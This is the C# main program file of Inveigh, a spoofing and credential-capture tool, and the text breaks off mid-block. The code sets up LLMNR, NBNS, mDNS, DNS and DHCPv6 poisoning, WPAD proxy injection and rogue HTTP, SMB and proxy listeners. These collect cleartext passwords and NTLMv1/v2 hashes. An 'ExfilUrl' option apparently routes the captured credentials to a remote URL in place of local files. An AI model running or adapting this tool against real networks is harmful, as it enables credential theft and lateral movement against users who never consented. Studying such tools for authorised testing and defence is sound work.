﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.Text.RegularExpressions;

namespace Inveigh
{

    class Program
    {
        public static Hashtable smbSessionTable = Hashtable.Synchronized(new Hashtable());
        public static Hashtable httpSessionTable = Hashtable.Synchronized(new Hashtable());
        public static IList<string> outputList = new List<string>();
        static IList<string> consoleList = new List<string>();
        static IList<string> logList = new List<string>();
        static IList<string> logFileList = new List<string>();
        public static IList<string> cleartextList = new List<string>();
        public static IList<string> cleartextFileList = new List<string>();
        public static IList<string> hostList = new List<string>();
        public static IList<string> hostFileList = new List<string>();
        public static IList<string> ntlmv1List = new List<string>();
        public static IList<string> ntlmv2List = new List<string>();
        public static IList<string> ntlmv1FileList = new List<string>();
        public static IList<string> ntlmv2FileList = new List<string>();
        public static IList<string> ntlmv1UsernameList = new List<string>();
        public static IList<string> ntlmv2UsernameList = new List<string>();
        public static IList<string> ntlmv1UsernameFileList = new List<string>();
        public static IList<string> ntlmv2UsernameFileList = new List<string>();
        public static bool consoleOutput = true;
        public static bool exitInveigh = false;
        public static bool enabledConsoleUnique = false;
        public static bool enabledElevated = false;
        public static bool enabledFileOutput = false;
        public static bool enabledFileUnique = false;
        public static bool enabledHTTP = false;
        public static bool enabledDHCPv6 = false;
        public static bool enabledDHCPv6Local = false;
        public static bool enabledDNS = false;
        public static bool enabledInspect = false;
        public static bool enabledNBNS = false;
        public static bool enabledLLMNR = false;
        public static bool enabledLLMNRv6 = false;
        public static bool enabledLogOutput = false;
        public static bool enabledMDNS = false;
        public static bool enabledPcap = false;
        public static bool enabledProxy = false;
        public static bool enabledMachineAccounts = false;
        public static bool enabledSMB = false;
        public static bool enabledSpooferRepeat = false;
        public static bool enabledNetworkExfil = true;
        //begin parameters - set defaults as needed before compile
        public static string[] argSpooferDomainsIgnore;
        public static string[] argSpooferDomainsReply;
        public static string[] argSpooferHostsIgnore;
        public static string[] argSpooferHostsReply;
        public static string[] argSpooferIPsIgnore;
        public static string[] argSpooferIPsReply;
        public static string[] argSpooferMACsIgnore;
        public static string[] argSpooferMACsReply;
        public static string argFileOutputDirectory = System.IO.Directory.GetCurrentDirectory();
        public static string argFilePrefix = "Inveigh";
        public static string argExfilUrl = "";

        static void Main(string[] args)
        {           
            string argChallenge = "";
            string argConsoleQueueLimit = "-1";
            string argConsoleStatus = "0";
            string argConsoleUnique = "Y";
            string argDHCPv6 = "N";
            string argDHCPv6Local = "N";
            string argDHCPv6DNSSuffix = "";
            string argDHCPv6RA = "30";
            string argDNS = "Y";
            string argDNSHost = "";
            string argDNSTTL = "30";
            string[] argDNSTypes = { "A" };
            string argElevated = "Y";
            string argFileOutput = "Y";
            string argFileUnique = "Y";
            string argHelp = "";
            string argHTTP = "Y";
            string argHTTPAuth = "NTLM";
            string argHTTPBasicRealm = "ADFS";
            string argHTTPIP = "0.0.0.0";
            string argHTTPPort = "80";
            string argHTTPResponse = "";
            string argIP = "";
            string argIPv6 = "";
            bool argInspect = false;
            string argLLMNR = "Y";
            string argLLMNRTTL = "30";
            string argLLMNRv6 = "N";
            string argLogOutput = "Y";
            string argMAC = "";
            string argMachineAccounts = "N";
            string argMDNS = "N";
            string argMDNSTTL = "120";
            string[] argMDNSQuestions = { "QU", "QM" };
            string[] argMDNSTypes = { "A" };
            string argNBNS = "N";
            string argNBNSTTL = "165";
            string[] argNBNSTypes = { "00", "20" };
            string argPcap = "N";
            string[] argPcapTCP = { "139", "445" };
            string[] argPcapUDP = null;
            string argProxy = "N";
            string argProxyAuth = "NTLM";
            string[] argProxyIgnore = { "Firefox" };
            string argProxyIP = "0.0.0.0";
            string argProxyPort = "8492";
            string argProxyPortFailover = "";
            string argSMB = "Y";
            string argSpooferIP = "";
            string argSpooferIPv6 = "";
            string argSpooferRepeat = "Y";
            string argRunCount = "0";
            string argRunTime = "0";
            string argWPADAuth = "NTLM";
            string[] argWPADAuthIgnore = { "Firefox" };
            string[] argWPADDirectHosts = null;
            string argWPADIP = "";
            string argWPADPort = "";
            string argWPADResponse = "function FindProxyForURL(url,host) {return \"DIRECT\";}";
            //end parameters

            bool isArgNBNS = false;
            bool isSession = false;
            string computerName = System.Environment.MachineName;
            string netbiosDomain = System.Environment.UserDomainName;
            string dnsDomain = "";
            string wpadDirectHosts = "";
            int consoleQueueLimit = -1;
            int consoleStatus = 0;
            int runCount = 0;
            int runTime = 0;
            int dhcpv6RA = 0;
            IList wpadDirectHostsList = new List<string>();

            try
            {
                dnsDomain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            catch
            {
                dnsDomain = netbiosDomain;
            }

            if (args.Length > 0)
            {

                foreach (var entry in args.Select((value, index) => new { index, value }))
                {
                    string arg = entry.value.ToUpper();

                    switch (arg)
                    {
                        case "-CHALLENGE":
                        case "/CHALLENGE":
                            argChallenge = args[entry.index + 1].ToUpper();
                            break;

                        case "-CONSOLEQUEUELIMIT":
                        case "/CONSOLEQUEUELIMIT":
                            argConsoleQueueLimit = args[entry.index + 1];
                            break;

                        case "-CONSOLESTATUS":
                        case "/CONSOLESTATUS":
                            argConsoleStatus = args[entry.index + 1];
                            break;

                        case "-CONSOLEUNIQUE":
                        case "/CONSOLEUNIQUE":
                            argConsoleUnique = args[entry.index + 1].ToUpper();
                            break;

                        case "-DHCPV6":
                        case "/DHCPV6":
                            argDHCPv6 = args[entry.index + 1].ToUpper();
                            break;

                        case "-DHCPV6LOCAL":
                        case "/DHCPV6LOCAL":
                            argDHCPv6Local = args[entry.index + 1].ToUpper();
                            break;

                        case "-DHCPV6DNSSUFFIX":
                        case "/DHCPV6DNSSUFFIX":
                            argDHCPv6DNSSuffix = args[entry.index + 1];
                            break;

                        case "-DHCPV6RA":
                        case "/DHCPV6RA":
                            argDHCPv6RA = args[entry.index + 1];
                            break;

                        case "-DNS":
                        case "/DNS":
                            argDNS = args[entry.index + 1].ToUpper();
                            break;

                        case "-DNSHOST":
                        case "/DNSHOST":
                            argDNSHost = args[entry.index + 1];
                            break;

                        case "-DNSTTL":
                        case "/DNSTTL":
                            argDNSTTL = args[entry.index + 1].ToUpper();
                            break;

                        case "-DNSTYPES":
                        case "/DNSTYPES":
                            argDNSTypes = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-ELEVATED":
                        case "/ELEVATED":
                            argElevated = args[entry.index + 1].ToUpper();
                            break;

                        case "-EXFILURL":
                        case "/EXFILURL":
                            argExfilUrl = args[entry.index + 1];
                            argFileOutput = "N";
                            break;

                        case "-FILEOUTPUT":
                        case "/FILEOUTPUT":
                            argFileOutput = args[entry.index + 1].ToUpper();
                            break;

                        case "-FILEOUTPUTDIRECTORY":
                        case "/FILEOUTPUTDIRECTORY":
                            argFileOutputDirectory = args[entry.index + 1].ToUpper();
                            break;
                        case "-FILEPREFIX":
                        case "/FILEPREFIX":
                            argFilePrefix = args[entry.index + 1].ToUpper();
                            break;

                        case "-FILEUNIQUE":
                        case "/FILEUNIQUE":
                            argFileUnique = args[entry.index + 1].ToUpper();
                            break;

                        case "-HTTP":
                        case "/HTTP":
                            argHTTP = args[entry.index + 1].ToUpper();
                            break;

                        case "-HTTPAUTH":
                        case "/HTTPAUTH":
                            argHTTPAuth = args[entry.index + 1].ToUpper();
                            break;

                        case "-HTTPBASICREALM":
                        case "/HTTPBASICREALM":
                            argHTTPBasicRealm = args[entry.index + 1];
                            break;

                        case "-HTTPIP":
                        case "/HTTPIP":
                            argHTTPIP = args[entry.index + 1];
                            break;

                        case "-HTTPPORT":
                        case "/HTTPPORT":
                            argHTTPPort = args[entry.index + 1];
                            break;

                        case "-HTTPRESPONSE":
                        case "/HTTPRESPONSE":
                            argHTTPResponse = args[entry.index + 1];
                            break;

                        case "-INSPECT":
                        case "/INSPECT":
                            argInspect = true;
                            break;

                        case "-IP":
                        case "/IP":
                            argIP = args[entry.index + 1].ToUpper();
                            break;

                        case "-IPV6":
                        case "/IPV6":
                            argIPv6 = args[entry.index + 1].ToUpper();
                            break;

                        case "-LLMNR":
                        case "/LLMNR":
                            argLLMNR = args[entry.index + 1].ToUpper();
                            break;

                        case "-LLMNRV6":
                        case "/LLMNRV6":
                            argLLMNRv6 = args[entry.index + 1].ToUpper();
                            break;

                        case "-LLMNRTTL":
                        case "/LLMNRTTL":
                            argLLMNRTTL = args[entry.index + 1].ToUpper();
                            break;

                        case "-LOGOUTPUT":
                        case "/LOGOUTPUT":
                            argLogOutput = args[entry.index + 1].ToUpper();
                            break;

                        case "-MAC":
                        case "/MAC":
                            argMAC = args[entry.index + 1].ToUpper().Replace(":", "").Replace("-", "");
                            break;

                        case "-MACHINEACCOUNTS":
                        case "/MACHINEACCOUNTS":
                            argMachineAccounts = args[entry.index + 1].ToUpper();
                            break;

                        case "-MDNS":
                        case "/MDNS":
                            argMDNS = args[entry.index + 1].ToUpper();
                            break;

                        case "-MDNSTTL":
                        case "/MDNSTTL":
                            argMDNSTTL = args[entry.index + 1].ToUpper();
                            break;

                        case "-MDNSQUESTIONS":
                        case "/MDNSQUESTIONS":
                            argMDNSQuestions = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-MDNSTYPES":
                        case "/MDNSTYPES":
                            argMDNSTypes = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-NBNS":
                        case "/NBNS":
                            argNBNS = args[entry.index + 1].ToUpper();
                            isArgNBNS = true;
                            break;

                        case "-NBNSTTL":
                        case "/NBNSTTL":
                            argNBNSTTL = args[entry.index + 1].ToUpper();
                            break;

                        case "-NBNSTYPES":
                        case "/NBNSTYPES":
                            argNBNSTypes = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-PCAP":
                        case "/PCAP":
                            argPcap = args[entry.index + 1].ToUpper();
                            break;

                        case "-PCAPTCP":
                        case "/PCAPTCP":
                            argPcapTCP = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-PCAPUDP":
                        case "/PCAPUDP":
                            argPcapUDP = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-PROXY":
                        case "/PROXY":
                            argProxy = args[entry.index + 1].ToUpper();
                            break;

                        case "-PROXYIGNORE":
                        case "/PROXYIGNORE":
                            argProxyIgnore = args[entry.index + 1].Split(',');
                            break;

                        case "-PROXYIP":
                        case "/PROXYIP":
                            argProxyIP = args[entry.index + 1];
                            break;

                        case "-PROXYPORT":
                        case "/PROXYPORT":
                            argProxyPort = args[entry.index + 1];
                            break;

                        case "-RUNCOUNT":
                        case "/RUNCOUNT":
                            argRunCount = args[entry.index + 1];
                            break;

                        case "-RUNTIME":
                        case "/RUNTIME":
                            argRunTime = args[entry.index + 1];
                            break;

                        case "-SMB":
                        case "/SMB":
                            argSMB = args[entry.index + 1].ToUpper();
                            break;

                        case "-SPOOFERDOMAINSIGNORE":
                        case "/SPOOFERDOMAINSIGNORE":
                            argSpooferDomainsIgnore = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-SPOOFERDOMAINSREPLY":
                        case "/SPOOFERDOMAINSREPLY":
                            argSpooferDomainsReply = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-SPOOFERHOSTSIGNORE":
                        case "/SPOOFERHOSTSIGNORE":
                            argSpooferHostsIgnore = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-SPOOFERHOSTSREPLY":
                        case "/SPOOFERHOSTSREPLY":
                            argSpooferHostsReply = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-SPOOFERIP":
                        case "/SPOOFERIP":
                            argSpooferIP = args[entry.index + 1];
                            break;

                        case "-SPOOFERIPV6":
                        case "/SPOOFERIPV6":
                            argSpooferIPv6 = args[entry.index + 1].ToUpper();
                            break;

                        case "-SPOOFERIPSIGNORE":
                        case "/SPOOFERIPSIGNORE":
                            argSpooferIPsIgnore = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-SPOOFERIPSREPLY":
                        case "/SPOOFERIPSREPLY":
                            argSpooferIPsReply = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-SPOOFERMACSIGNORE":
                        case "/SPOOFERMACSIGNORE":
                            argSpooferMACsIgnore = args[entry.index + 1].ToUpper().Replace(":","").Replace("-", "").Split(',');
                            break;

                        case "-SPOOFERMACSREPLY":
                        case "/SPOOFERMACSREPLY":
                            argSpooferMACsReply = args[entry.index + 1].ToUpper().Replace(":","").Replace("-", "").Split(',');
                            break;

                        case "-SPOOFERREPEAT":
                        case "/SPOOFERREPEAT":
                            argSpooferRepeat = args[entry.index + 1].ToUpper();
                            break;

                        case "-WPADAUTH":
                        case "/WPADAUTH":
                            argWPADAuth = args[entry.index + 1].ToUpper();
                            break;

                        case "-WPADAUTHIGNORE":
                        case "/WPADAUTHIGNORE":
                            argWPADAuthIgnore = args[entry.index + 1].Split(',');
                            break;

                        case "-WPADDIRECTHOSTS":
                        case "/WPADDIRECTHOSTS":
                            argWPADDirectHosts = args[entry.index + 1].Split(',');
                            break;

                        case "-WPADIP":
                        case "/WPADIP":
                            argWPADIP = args[entry.index + 1];
                            break;

                        case "-WPADPORT":
                        case "/WPADPORT":
                            argWPADPort = args[entry.index + 1];
                            break;

                        case "-WPADRESPONSE":
                        case "/WPADRESPONSE":
                            argWPADResponse = args[entry.index + 1];
                            break;

                        case "-?":
                        case "/?":
                            if (args.Length > 1)
                                argHelp = args[entry.index + 1].ToUpper();
                            GetHelp(argHelp);
                            Environment.Exit(0);
                            break;

                        default:
                            if (arg.StartsWith("-") || arg.StartsWith("/"))
                                throw new ArgumentException(paramName: arg, message: "Invalid Parameter");
                            break;
                    }

                }
            }

            Regex r = new Regex("^[A-Fa-f0-9]{16}$"); if (!String.IsNullOrEmpty(argChallenge) && !r.IsMatch(argChallenge)) { throw new ArgumentException("Challenge is invalid"); }
            r = new Regex("^[A-Fa-f0-9]{12}$"); if (!String.IsNullOrEmpty(argMAC) && !r.IsMatch(argMAC)) { throw new ArgumentException("MAC address is invalid"); }
            try { consoleQueueLimit = Int32.Parse(argConsoleQueueLimit); } catch { throw new ArgumentException("ConsoleQueueLimit value must be a integer"); }
            try { consoleStatus = Int32.Parse(argConsoleStatus); } catch { throw new ArgumentException("ConsoleStatus value must be a integer"); }
            if (!String.Equals(argConsoleUnique, "Y") && !String.Equals(argConsoleUnique, "N")) throw new ArgumentException("ConsoleUnique value must be Y or N");
            if (!String.Equals(argDNS, "Y") && !String.Equals(argDNS, "N")) throw new ArgumentException("DNS value must be Y or N");
            try { Int32.Parse(argDNSTTL); } catch { throw new ArgumentException("DNSTTL value must be a integer"); }
            if (argDNSTypes != null && argDNSTypes.Length > 0) { foreach (string type in argDNSTypes) { if (!String.Equals(type, "A") && !String.Equals(type, "SOA") && !String.Equals(type, "SRV")) { throw new ArgumentException("DNSTypes valid values are A, SOA, and SRV"); } } }
            if ((argDNSTypes.Contains("SOA") || argDNSTypes.Contains("SRV")) && argDNSHost.Split('.').Count() < 3) throw new ArgumentException("DNSHost must be specified and fully qualified when using DNSTypes SOA or SRV");
            if (!String.Equals(argDHCPv6, "Y") && !String.Equals(argDHCPv6, "N")) throw new ArgumentException("DHCPv6 value must be Y or N");
            if (!String.Equals(argDHCPv6Local, "Y") && !String.Equals(argDHCPv6Local, "N")) throw new ArgumentException("DHCPv6Local value must be Y or N");
            try { dhcpv6RA = Int32.Parse(argDHCPv6RA); } catch { throw new ArgumentException("DHCPv6RA value must be a integer"); }
            if (!String.Equals(argFileOutput, "Y") && !String.Equals(argFileOutput, "N")) throw new ArgumentException("FileOutput value must be Y or N");
            if (String.Equals(argFileOutput, "Y") && !System.IO.Directory.Exists(argFileOutputDirectory)) { throw new ArgumentException("FileOutputDirectory is invalid"); }
            if (!String.Equals(argFileUnique, "Y") && !String.Equals(argFileUnique, "N")) throw new ArgumentException("FileUnique value must be Y or N");
            if (!String.Equals(argHTTP, "Y") && !String.Equals(argHTTP, "N")) throw new ArgumentException("HTTP value must be Y or N");
            try { IPAddress.Parse(argHTTPIP); } catch { throw new ArgumentException("HTTPIP value must be an IP address"); }
            try { Int32.Parse(argHTTPPort); } catch { throw new ArgumentException("HTTPPort value must be a integer"); }
            if (!String.IsNullOrEmpty(argIP)) { try { IPAddress.Parse(argIP); } catch { throw new ArgumentException("IP value must be an IP address"); } }
            if (!String.IsNullOrEmpty(argIPv6)) { try { IPAddress.Parse(argIPv6); } catch { throw new ArgumentException("IPv6 value must be an IPv6 address"); } }
            if (!String.Equals(argHTTPAuth, "ANONYMOUS") && !String.Equals(argHTTPAuth, "BASIC") && !String.Equals(argHTTPAuth, "NTLM") && !String.Equals(argHTTPAuth, "NTLMNOESS")) throw new ArgumentException("HTTPAuth value must be Anonymous, Basic, NTLM, or NTLMNoESS");
            if (!String.Equals(argLLMNR, "Y") && !String.Equals(argLLMNR, "N")) throw new ArgumentException("LLMNR value must be Y or N");
            try { Int32.Parse(argLLMNRTTL); } catch { throw new ArgumentException("LLMNRTTL value must be a integer"); }
            if (!String.Equals(argLLMNRv6, "Y") && !String.Equals(argLLMNRv6, "N")) throw new ArgumentException("LLMNRv6 value must be Y or N");
            if (!String.Equals(argLogOutput, "Y") && !String.Equals(argLogOutput, "N")) throw new ArgumentException("LogOutput value must be Y or N");
            if (!String.Equals(argMachineAccounts, "Y") && !String.Equals(argMachineAccounts, "N")) throw new ArgumentException("MachineAccounts value must be Y or N");
            if (!String.Equals(argMDNS, "Y") && !String.Equals(argMDNS, "N")) throw new ArgumentException("mDNS value must be Y or N");
            try { Int32.Parse(argMDNSTTL); } catch { throw new ArgumentException("mDNSTTL value must be a integer"); }
            if (argMDNSQuestions != null && argMDNSQuestions.Length > 0) { foreach (string type in argMDNSQuestions) { if (!String.Equals(type, "QM") && !String.Equals(type, "QU")) { throw new ArgumentException("MDNSQuestions valid values are QM and QU"); } } }
            if (!String.Equals(argNBNS, "Y") && !String.Equals(argNBNS, "N")) throw new ArgumentException("NBNS value must be Y or N");
            try { Int32.Parse(argNBNSTTL); } catch { throw new ArgumentException("NBNSTTL value must be a integer"); }
            if (argNBNSTypes != null && argNBNSTypes.Length > 0) { foreach (string type in argNBNSTypes) { if (!String.Equals(type, "00") && !String.Equals(type, "03") && !String.Equals(type, "20") && !String.Equals(type, "1B") && !String.Equals(type, "1C") && !String.Equals(type, "1D") && !String.Equals(type, "1E")) { throw new ArgumentException("NBNSTypes valid values are 00, 03, 20, 1B, 1C, 1D, and 1E"); }}}
            if (!String.Equals(argPcap, "Y") && !String.Equals(argPcap, "N")) throw new ArgumentException("Pcap value must be Y or N");
            if (argPcapTCP != null && argPcapTCP.Length > 0) { foreach (string port in argPcapTCP) { if (!String.Equals(port, "ALL")) { try { Int32.Parse(port); } catch { throw new ArgumentException("PcapPortTCP values must be an integer"); } } } }
            if (argPcapUDP != null && argPcapUDP.Length > 0) { foreach (string port in argPcapUDP) { if (!String.Equals(port, "ALL")) { try { Int32.Parse(port); } catch { throw new ArgumentException("PcapPortUDP values must be an integer"); } } } }
            if (!String.Equals(argProxy, "Y") && !String.Equals(argProxy, "N")) throw new ArgumentException("Proxy value must be Y or N");
            if (!String.Equals(argProxyAuth, "BASIC") && !String.Equals(argProxyAuth, "NTLM") && !String.Equals(argProxyAuth, "NTLMNOESS")) throw new ArgumentException("ProxyAuth value must be Basic, NTLM, or NTLMNoESS");
            try { IPAddress.Parse(argProxyIP); } catch { throw new ArgumentException("ProxyIP value must be an IP address"); }
            try { Int32.Parse(argProxyPort); } catch { throw new ArgumentException("ProxyPort value must be a integer"); }
            try { runCount = Int32.Parse(argRunCount); } catch { throw new ArgumentException("RunCount value must be a integer"); }
            try { runTime = Int32.Parse(argRunTime); } catch { throw new ArgumentException("RunTime value must be a integer"); }
            if (!String.Equals(argSMB, "Y") && !String.Equals(argSMB, "N")) throw new ArgumentException("SMB value must be Y or N");
            if (!String.IsNullOrEmpty(argSpooferIP)) { try { IPAddress.Parse(argSpooferIP); } catch { throw new ArgumentException("SpooferIP value must be an IP address"); } }
            if (!String.IsNullOrEmpty(argSpooferIPv6)) { try { IPAddress.Parse(argSpooferIPv6); } catch { throw new ArgumentException("SpooferIP value must be an IP address"); } }
            if (!String.Equals(argProxyAuth, "BASIC") && !String.Equals(argWPADAuth, "NTLM") && !String.Equals(argWPADAuth, "NTLMNOESS") && !String.Equals(argWPADAuth, "ANONYMOUS")) throw new ArgumentException("WPADAuth value must be Anonymous, Basic, NTLM, or NTLMNoESS");
            if (!String.IsNullOrEmpty(argWPADIP)) { try { IPAddress.Parse(argWPADIP); } catch { throw new ArgumentException("WPADIP value must be an IP address"); } }
            if (!String.IsNullOrEmpty(argWPADPort)) { try { Int32.Parse(argWPADPort); } catch { throw new ArgumentException("WPADPort value must be an integer"); } }
            if (String.Equals(argConsoleUnique, "Y")) { enabledConsoleUnique = true; }
            if (String.Equals(argElevated, "Y")) { enabledElevated = true; }
            if (String.Equals(argFileOutput, "Y")) { enabledFileOutput = true; }
            if (String.Equals(argFileUnique, "Y")) { enabledFileUnique = true; }
            if (String.Equals(argDHCPv6, "Y")) { enabledDHCPv6 = true; }
            if (String.Equals(argDHCPv6Local, "Y")) { enabledDHCPv6Local = true; }
            if (String.Equals(argDNS, "Y")) { enabledDNS = true; }
            if (String.Equals(argHTTP, "Y")) { enabledHTTP = true; }
            if (argInspect) { enabledInspect = true; }
            if (String.Equals(argLLMNR, "Y")) { enabledLLMNR = true; }
            if (String.Equals(argLLMNRv6, "Y")) { enabledLLMNRv6 = true; }
            if (String.Equals(argLogOutput, "Y")) { enabledLogOutput = true; }
            if (String.Equals(argMDNS, "Y")) { enabledMDNS = true; }
            if (String.Equals(argPcap, "Y")) { enabledPcap = true; }
            if (String.Equals(argProxy, "Y")) { enabledProxy = true; }
            if (String.Equals(argMachineAccounts, "Y")) { enabledMachineAccounts = true; }
            if (String.Equals(argNBNS, "Y")) { enabledNBNS = true; }
            if (String.Equals(argSMB, "Y")) { enabledSMB = true; }
            if (String.Equals(argSpooferRepeat, "Y")) { enabledSpooferRepeat = true; }

            if (enabledLogOutput && System.IO.File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-Log.txt"))))
            {
                isSession = true;
                string[] file = System.IO.File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-Log.txt")));

                foreach (string line in file)
                {
                    logList.Add(line);
                }

            }

            if (System.IO.File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-Cleartext.txt"))))
            {
                isSession = true;
                string[] file = System.IO.File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-Cleartext.txt")));

                foreach (string line in file)
                {
                    cleartextList.Add(line);
                }

            }

            if (System.IO.File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv1.txt"))))
            {
                isSession = true;
                string[] file = System.IO.File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv1.txt")));

                foreach (string line in file)
                {
                    ntlmv1List.Add(line);
                }

            }

            if (System.IO.File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv2.txt"))))
            {
                isSession = true;
                string[] file = System.IO.File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv2.txt")));

                foreach (string line in file)
                {
                    ntlmv2List.Add(line);
                }

            }

            if (System.IO.File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv1Users.txt"))))
            {
                isSession = true;
                string[] file = System.IO.File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv1Users.txt")));

                foreach (string line in file)
                {
                    ntlmv1UsernameList.Add(line);
                }

            }

            if (System.IO.File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv2Users.txt"))))
            {
                isSession = true;
                string[] file = System.IO.File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv2Users.txt")));

                foreach (string line in file)
                {
                    ntlmv2UsernameList.Add(line);
                }

            }

            if (System.IO.File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-DHCPv6.txt"))))
            {
                isSession = true;
                string[] file = System.IO.File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-DHCPv6.txt")));

                foreach (string line in file)
                {
                    hostList.Add(line);
                }

            }

            if (string.IsNullOrEmpty(argIP))
            {
                argIP = Util.GetLocalIPAddress("IPv4");
            }

            if (string.IsNullOrEmpty(argIPv6))
            {
                argIPv6 = Util.GetLocalIPAddress("IPv6");
            }

            if (string.IsNullOrEmpty(argMAC) && !string.IsNullOrEmpty(argIPv6))
            {
                argMAC = Util.GetLocalMACAddress(IPAddress.Parse(argIPv6).ToString());
            }

            if (!string.IsNullOrEmpty(argMAC) && !string.IsNullOrEmpty(argIPv6))
            {
                argMAC = argMAC.Insert(2, ":").Insert(5, ":").Insert(8, ":").Insert(11, ":").Insert(14, ":");
            }
            else
            {
                enabledDHCPv6 = false;
            }

            if (string.IsNullOrEmpty(argSpooferIP))
            {
                argSpooferIP = argIP;
            }

            if (string.IsNullOrEmpty(argSpooferIPv6))
            {
                argSpooferIPv6 = argIPv6;
            }

            if (!enabledElevated)
            {
                enabledPcap = false;
                enabledSMB = false;
            }

            if (!enabledElevated && !isArgNBNS)
            {
                enabledNBNS = true;
            }

            if (argInspect)
            {

                if (enabledElevated)
                {
                    enabledHTTP = false;
                    enabledProxy = false;
                    enabledSMB = false;
                }
                else
                {
                    enabledHTTP = false;
                    enabledProxy = false;
                }

            }

            if (argWPADDirectHosts != null && argWPADDirectHosts.Length > 0)
            {
                int i = 0;

                foreach (string host in argWPADDirectHosts)
                {
                    argWPADDirectHosts[i] = String.Concat("if (dnsDomainIs(host, \"", host, "\")) return \"DIRECT\";");
                    i++;
                }

                wpadDirectHosts = String.Join("", argWPADDirectHosts);
            }

            if (enabledProxy)
            {
                argProxyPortFailover = (Int32.Parse(argProxyPort) + 1).ToString();
                argWPADResponse = String.Concat("function FindProxyForURL(url,host){", wpadDirectHosts, "return \"PROXY ", argIP, ":", argProxyPort, "; PROXY ", argIP, ":", argProxyPortFailover, "; DIRECT\";}");
            }
            else if (!String.IsNullOrEmpty(argWPADIP) && !String.IsNullOrEmpty(argWPADPort))
            {
                argWPADResponse = String.Concat("function FindProxyForURL(url,host) {", wpadDirectHosts, "return \"PROXY", argWPADIP, ":", argWPADPort, "; DIRECT\";}");
            }

            string version = "0.913";
            string optionStatus = "";
            outputList.Add(String.Format("[*] Inveigh {0} started at {1}", version, DateTime.Now.ToString("s")));
            if (enabledElevated) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] Elevated Privilege Mode = {0}", optionStatus));
            if (argInspect) { outputList.Add("[+] Inspect Only Mode = Enabled"); }
            outputList.Add(String.Format("[+] Primary IP Address = {0}", argIP));
            if (!String.IsNullOrEmpty(argIPv6)) outputList.Add(String.Format("[+] Primary IPv6 Address = {0}", argIPv6));
            outputList.Add(String.Format("[+] Spoofer IP Address = {0}", argSpooferIP));
            if (!String.IsNullOrEmpty(argSpooferIPv6)) outputList.Add(String.Format("[+] Spoofer IPv6 Address = {0}", argSpooferIPv6));
            if (!String.IsNullOrEmpty(argMAC)) outputList.Add(String.Format("[+] Spoofer MAC Address = {0}", argMAC));
            if (argSpooferDomainsIgnore != null) outputList.Add(String.Format("[+] Spoofer Domain Ignore = {0}", String.Join(",", argSpooferDomainsIgnore)));
            if (argSpooferDomainsReply != null) outputList.Add(String.Format("[+] Spoofer Domains Reply = {0}", String.Join(",", argSpooferDomainsReply)));
            if (argSpooferHostsIgnore != null) outputList.Add(String.Format("[+] Spoofer Hosts Ignore = {0}", String.Join(",", argSpooferHostsIgnore)));
            if (argSpooferHostsReply != null) outputList.Add(String.Format("[+] Spoofer Hosts Reply = {0}", String.Join(",", argSpooferHostsReply)));
            if (argSpooferIPsIgnore != null) outputList.Add(String.Format("[+] Spoofer IPs Ignore = {0}", String.Join(",", argSpooferIPsIgnore)));
            if (argSpooferIPsReply != null) outputList.Add(String.Format("[+] Spoofer IPs Reply = {0}", String.Join(",", argSpooferIPsReply)));
            if (argSpooferMACsIgnore != null) outputList.Add(String.Format("[+] Spoofer MACs Ignore = {0}", String.Join(",", argSpooferMACsIgnore)));
            if (argSpooferMACsReply != null) outputList.Add(String.Format("[+] Spoofer MACs Reply = {0}", String.Join(",", argSpooferMACsReply)));
            if (enabledElevated) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] Packet Sniffer = {0}", optionStatus));
            if (enabledDHCPv6) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] DHCPv6 Spoofer = {0}", optionStatus));

            if (enabledDHCPv6)
            {
                if (enabledDHCPv6Local) optionStatus = "Enabled";
                else optionStatus = "Disabled";
                outputList.Add(String.Format("[+] DHCPv6 Local Attacks = {0}", optionStatus));
                if (!String.IsNullOrEmpty(argDHCPv6DNSSuffix)) outputList.Add(String.Format("[+] DHCPv6 DNS Suffix = {0}", argDHCPv6DNSSuffix));
                if (dhcpv6RA > 0) outputList.Add(String.Format("[+] DHCPv6 ICMPv6 Router Advertise Interval = {0} Seconds", argDHCPv6RA));             
            }

            if (enabledDNS) optionStatus = "Enabled";

            if (enabledDNS)
            {
                outputList.Add(String.Format("[+] DNS Spoofer For Types {0} = Enabled", String.Join(",", argDNSTypes)));
